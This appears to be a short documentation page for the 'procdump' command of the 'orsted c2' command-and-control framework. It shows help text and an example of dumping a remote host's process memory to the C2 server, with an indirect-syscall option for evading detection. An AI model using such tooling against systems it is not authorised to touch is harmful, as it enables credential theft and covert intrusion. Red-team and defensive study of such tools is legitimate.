---

title: procdump
descripton: orsted c2 procdump
---

### General

`procdump` allows you to dump process memory.

```
[Session 11: haroun@DESKTOP-DU89UIV] » procdump --help

dump a process to a local file in the server

Usage:
  procdump [flags] pid path

Args:
  pid   string    pid of the process
  path  string    local destination on the server

Flags:
  -h, --help       display help
  -n, --native     Dump process with native indirect syscall ntapi
```

For example

```powershell
[Session 11: haroun@DESKTOP-DU89UIV] » procdump 7655 /tmp/dump_7655
```

You can use the `--native` flag to dump a procewss with indirect syscall.
